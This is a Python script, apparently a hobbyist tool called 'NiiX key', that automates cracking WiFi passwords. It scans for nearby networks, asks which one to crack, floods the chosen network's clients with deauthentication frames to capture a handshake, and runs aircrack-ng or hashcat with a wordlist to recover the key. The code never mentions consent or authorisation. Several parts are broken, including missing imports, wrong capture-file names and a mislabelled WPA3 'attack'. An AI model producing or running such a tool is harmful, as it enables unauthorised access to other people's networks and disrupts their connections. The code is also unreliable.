#!/usr/bin/env python3

# NiiX key - WiFi Cracking Script
# Created by: cuteLiLi / techniix
# Version: b2.0

import subprocess
from collections import namedtuple
import os
import time
import platform
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Elt

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal'])

def get_os():
    """Detect the operating system."""
    system = platform.system()
    
    if system == "Linux":
        return "Linux"
    else:
        return "Unknown"

def install_dependencies(os_type):
    """Install necessary dependencies based on the operating system."""
    try:
        print(f"Installing necessary dependencies for {os_type}...")
        
        if os_type == "Linux":
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run([
                'sudo', 'apt-get', 'install', '-y',
                'aircrack-ng', 'reaver', 'python3-scapy', 'python3-pip',
                'hashcat', 'wpa_supplicant', 'wget', 'iwlist'
            ], check=True)
        
        print("Dependencies installed successfully.")
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        exit(1)

def get_interfaces():
    """Get available wireless interfaces."""
    try:
        output = subprocess.check_output(['iwconfig']).decode('utf-8')
        lines = output.splitlines()
        interfaces = []
        for line in lines:
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        return interfaces
    except Exception as e:
        print(f"Error getting interfaces: {e}")
        exit(1)

def get_networks(interface):
    """Scan for available WiFi networks and return them sorted by signal strength."""
    try:
        print(f"Scanning networks on interface {interface}...")
        networks = []
        interface_mon = interface + 'mon'
        
        # Start monitor mode
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8')
                bssid = pkt[Dot11].addr2
                channel = ord(pkt.notdecoded[-4:-3])
                signal = int(ord(pkt.notdecoded[-2:-1]) - 256)
                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
        
        sniff(iface=interface_mon, prn=packet_handler, timeout=30)
        
        # Stop monitor mode
        subprocess.run(['airmon-ng', 'stop', interface_mon], check=True)
        
        return sorted(networks, key=lambda n: n.signal, reverse=True)

    except Exception as e:
        print(f"Error scanning networks: {e}")
        return []

def display_menu(networks):
    """Display a numbered menu of available networks."""
    print("Available WiFi Networks (sorted by signal strength):")
    for i, network in enumerate(networks, 1):
        print(f"{i}. {network.ssid} ({network.bssid}, Channel: {network.channel})")
    choice = input("Enter the number of the network you want to crack: ")
    return int(choice) - 1

def capture_packets(interface_mon, bssid, channel, output_file='capture'):
    """Capture packets from the selected network."""
    try:
        subprocess.run(['airmon-ng', 'start', interface_mon], check=True)
        airodump_process = subprocess.Popen([
            'airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', output_file, interface_mon
        ])
        return airodump_process
    except Exception as e:
        print(f"Error capturing packets: {e}")
        return None

def deauthenticate_clients(interface_mon, bssid):
    """Deauthenticate clients connected to the target network."""
    try:
        subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, interface_mon], check=True)
    except Exception as e:
        print(f"Error deauthenticating clients: {e}")

def crack_wpa2(bssid, capture_file):
    """Attempt to crack the WPA2 password using aircrack-ng."""
    try:
        output = subprocess.check_output(['aircrack-ng', '-a', '2', '-b', bssid, capture_file + '.cap']).decode('utf-8')
        if "KEY FOUND!" in output:
            key = [line for line in output.splitlines() if "KEY FOUND!" in line][0].split()[3]
            print(f"Password cracked: {key}")
            return key
        else:
            print("Failed to crack the password.")
            return None
    except Exception as e:
        print(f"Error cracking WPA2: {e}")
        return None

def detect_wifi_type(bssid):
    """Detect WiFi type (WPA2 or WPA3) using iwlist."""
    try:
        output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8')
        if f"ESSID:\"{bssid}\"" in output and "RSNIE" in output and "Group Cipher: CCMP" in output:
            return "WPA3"
        elif f"ESSID:\"{bssid}\"" in output and "RSNIE" in output:
            return "WPA2"
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error detecting WiFi type: {e}")
        return "Unknown"

def crack_wpa3(bssid, capture_file):
    """Attempt to crack the WPA3 password using hashcat."""
    try:
        # Extract the PMKID from the capture file
        pmkid_extract = subprocess.run(
            ['hcxpcapngtool', '-E', f'{capture_file}-pmkids'],
            check=True,
            capture_output=True,
            text=True
        )
        
        if not os.path.exists(f'{capture_file}-pmkids'):
            print("No PMKIDs found.")
            return None
        
        # Check for the existence of hashcat
        if not shutil.which('hashcat'):
            print("Hashcat is not installed. Please install it to crack WPA3.")
            return None
        
        # Run hashcat with the appropriate attack mode
        hashcat_output = subprocess.run(
            ['hashcat', '-m', '16800', f'{capture_file}-pmkids', '/usr/share/wordlists/rockyou.txt'],
            check=True,
            capture_output=True,
            text=True
        )
        
        if "Recovered" in hashcat_output.stdout:
            key = hashcat_output.stdout.split(':')[3].strip()
            print(f"Password cracked: {key}")
            return key
        else:
            print("Failed to crack the password.")
            return None
    except subprocess.CalledProcessError as e:
        print(f"Hashcat error: {e.stderr}")
        return None

def cleanup_interfaces(interface_mon):
    """Stop monitor mode on all interfaces."""
    try:
        subprocess.run(['airmon-ng', 'stop'], check=True)
        if interface_mon:
            subprocess.run(['ifconfig', interface_mon, 'down'])
            subprocess.run(['iwconfig', interface_mon, 'mode', 'Managed'])
    except Exception as e:
        print(f"Error cleaning up interfaces: {e}")

def main():
    os_type = get_os()
    
    # Install dependencies if necessary
    install_dependencies(os_type)
    
    interfaces = get_interfaces()
    if not interfaces:
        print("No wireless interfaces found.")
        return
    
    interface = interfaces[0]
    print(f"Using interface: {interface}")
    
    networks = get_networks(interface)
    if not networks:
        print("No networks found.")
        cleanup_interfaces(None)
        return

    network_choice = display_menu(networks)
    selected_network = networks[network_choice]

    interface_mon = f"{interface}mon"

    airodump_process = capture_packets(interface_mon, selected_network.bssid, selected_network.channel)

    try:
        while True:
            deauthenticate_clients(interface_mon, selected_network.bssid)
            time.sleep(5)

            if os.path.exists(f'{selected_network.ssid}-01.cap'):
                break
    except KeyboardInterrupt:
        print("Handshake capture interrupted.")

    airodump_process.terminate()

    wifi_type = detect_wifi_type(selected_network.bssid)

    key = None
    if wifi_type == "WPA2":
        key = crack_wpa2(selected_network.bssid, selected_network.ssid)
    elif wifi_type == "WPA3":
        key = crack_wpa3(selected_network.bssid, selected_network.ssid)
    else:
        print("Unknown WiFi type.")
        cleanup_interfaces(interface_mon)
        return

    if not key:
        print("Password cracking failed.")
    else:
        print(f"Successfully cracked the password: {key}")

    cleanup_interfaces(interface_mon)

if __name__ == "__main__":
    main()
